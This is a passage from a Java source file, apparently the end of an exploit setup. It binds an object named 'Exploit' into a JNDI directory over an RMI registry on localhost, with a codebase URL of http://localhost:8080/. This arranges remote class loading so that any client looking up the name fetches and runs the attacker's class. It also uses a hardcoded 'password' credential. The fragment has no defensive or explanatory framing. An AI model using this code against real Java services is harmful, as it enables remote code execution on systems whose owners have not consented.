        env.put("java.naming.factory.initial", "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put("java.naming.provider.url", "rmi://localhost:1099");
        env.put("java.naming.security.authentication", "simple");
        env.put("java.naming.security.credentials", "password");

        DirContext ctx = new InitialDirContext(env);
        BasicAttributes attrs = new BasicAttributes();
        attrs.put(new BasicAttribute("objectClass", "javaNamingAndDirectoryAccessObject"));
        attrs.put(new BasicAttribute("javaCodeBase", "http://localhost:8080/"));
        attrs.put(new BasicAttribute("javaClassName", "Exploit"));
        ctx.bind("Exploit", null, attrs);
        ctx.close();
    }
}
```

